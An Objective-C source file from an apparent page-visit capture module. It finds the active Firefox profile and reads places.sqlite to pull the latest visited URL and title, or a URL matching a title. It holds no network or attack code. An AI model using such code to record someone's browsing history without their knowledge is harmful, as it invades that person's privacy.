//
//  FirefoxUrlInfoInquirer.m
//  PageVisitedCaptureManager
//
//  Created by Makara Khloth on 3/6/15.
//
//

#import "FirefoxUrlInfoInquirer.h"
#import "FirefoxProfileManager.h"

#import "DebugStatus.h"
#import "FMDatabase.h"
#import "FMResultSet.h"

@implementation FirefoxUrlInfoInquirer

@synthesize mFirefoxPID, mFirefoxDatabasePath;

- (instancetype) initWithFirefoxPID: (pid_t) aPID {
    NSString *placesPath = [[FirefoxProfileManager sharedManager] getPlacesPathOfPID:aPID];
    if (placesPath) {
        self = [super init];
        if (self) {
            self.mFirefoxPID = aPID;
            self.mFirefoxDatabasePath = placesPath;
        }
        return self;
    } else {
        return nil;
    }
}

- (NSDictionary *) lastUrlInfo {
    NSDictionary *urlInfo = nil;
    
    if (self.mFirefoxDatabasePath == nil) {
        self.mFirefoxDatabasePath = [self getActivePlacesPath];
    }
    
    if ([self.mFirefoxDatabasePath length] > 0) {
        FMDatabase *db = [FMDatabase databaseWithPath:self.mFirefoxDatabasePath];
        [db open];
        NSString *sql = @"select * from moz_places where id in (select place_id from moz_historyvisits where visit_date = (select max(visit_date) from moz_historyvisits))";
        FMResultSet *rs = [db executeQuery:sql];
        if ([rs next]) {
            NSString *url = [rs stringForColumn:@"url"];
            NSString *title = [rs stringForColumn:@"title"];
            DLog(@"url      = %@", url);
            DLog(@"title    = %@", title);
            
            urlInfo = [NSDictionary dictionaryWithObjectsAndKeys:url, @"url", title, @"title", nil];
        }
        [db close];
    }
    return (urlInfo);
}

- (NSString *) urlWithTitle: (NSString *) aTitle {
    NSString *URL = nil;
    
    if (self.mFirefoxDatabasePath == nil) {
        self.mFirefoxDatabasePath = [self getActivePlacesPath];
    }
    
    if ([self.mFirefoxDatabasePath length] > 0) {
        FMDatabase *db = [FMDatabase databaseWithPath:self.mFirefoxDatabasePath];
        [db open];
        NSString *sql = @"select * from moz_places where title = ? order by id desc limit 1";
        FMResultSet *rs = [db executeQuery:sql, aTitle];
        if ([rs next]) {
            NSString *url = [rs stringForColumn:@"url"];
            NSString *title = [rs stringForColumn:@"title"];
            DLog(@"url      = %@", url);
            DLog(@"title    = %@", title);
            
            URL = url;
        }
        [db close];
    }
    return (URL);
}

- (NSString *) getActivePlacesPath {
    NSString *activePlacesPath = nil;
    NSFileManager *fileManager = [NSFileManager defaultManager];
    NSArray *paths = NSSearchPathForDirectoriesInDomains(NSApplicationSupportDirectory, NSUserDomainMask, YES);
    NSString *applicationSupportPath = [paths firstObject];
    NSString *firefoxApplicationSupport = [applicationSupportPath stringByAppendingString:@"/Firefox/Profiles/"];
    
    NSMutableArray *placesPaths = [NSMutableArray arrayWithCapacity:1];
    NSArray *fileItems = [fileManager contentsOfDirectoryAtPath:firefoxApplicationSupport error:nil];
    for (NSString *fileItem in fileItems) {
        NSString *fullPath = [firefoxApplicationSupport stringByAppendingString:fileItem];
        NSDictionary *fileAttr = [fileManager attributesOfItemAtPath:fullPath error:nil];
        if ([[fileAttr fileType] isEqualToString:NSFileTypeDirectory]) {
            fullPath = [fullPath stringByAppendingString:@"/places.sqlite"];
            if ([fileManager fileExistsAtPath:fullPath]) {
                [placesPaths addObject:fullPath];
            }
        }
    }
    
    activePlacesPath = [placesPaths firstObject];
    NSDate *placesModificationDate = [[fileManager attributesOfItemAtPath:activePlacesPath error:nil] fileModificationDate];
    
    for (int i = 1; i < placesPaths.count; i++) {
        NSString *anotherPlacesPath = [placesPaths objectAtIndex:i];;
        NSDate *anotherPlacesModificationDate = [[fileManager attributesOfItemAtPath:anotherPlacesPath error:nil] fileModificationDate];
        if ([placesModificationDate compare:anotherPlacesModificationDate] == NSOrderedAscending) { // placesModificationDate < anotherPlacesModificationDate
            placesModificationDate = anotherPlacesModificationDate;
            activePlacesPath = anotherPlacesPath;
        }
    }
    DLog(@"activePlacesPath : %@", activePlacesPath);
    return activePlacesPath;
}

- (void) dealloc {
    [mFirefoxDatabasePath release];
    [super dealloc];
}

@end
